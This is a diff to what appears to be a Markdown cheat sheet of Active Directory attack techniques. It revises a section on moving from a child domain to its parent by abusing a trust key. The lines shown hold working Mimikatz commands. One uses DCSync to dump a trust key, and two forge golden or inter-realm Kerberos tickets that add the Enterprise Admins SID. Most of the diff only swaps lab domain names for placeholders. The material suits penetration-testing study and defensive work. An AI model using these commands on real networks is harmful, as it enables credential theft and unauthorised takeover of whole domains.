@@ -856,16 +856,19 @@ OR via DCSync:
 
 ```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:SUB$"'```
 
-We are looking for the **IN** Trust key (from external to current domain), and can then inject this into memory -
+We are looking for the **IN** Trust key (from external to current domain), and can then inject this into memory using ```/rc4:``` OR ```/krbtgt:```
+
+```/sids:``` is the SID of the Parent domain and Enterprise Admins RID
+
 
 trust tkt -
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ecorp.bcorp.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /rc4:f052addf1d43f864a7d0c21cbce440c9 /service:krbtgt /target:bcorp.lab /ticket:C:\Temp\trust_tkt.kirbi"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /rc4:f052addf1d43f864a7d0c21cbce440c9 /service:krbtgt /target:parent.lab /ticket:C:\Temp\trust_tkt.kirbi"'
 ```
 
 krbtgt -
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ecorp.bcorp.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /krbtgt:f052addf1d43f864a7d0c21cbce440c9 /ticket:C:\Temp\krbtgt_tkt.kirbi"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /krbtgt:f052addf1d43f864a7d0c21cbce440c9 /ticket:C:\Temp\krbtgt_tkt.kirbi"'
 ```
 
 # MS SQL
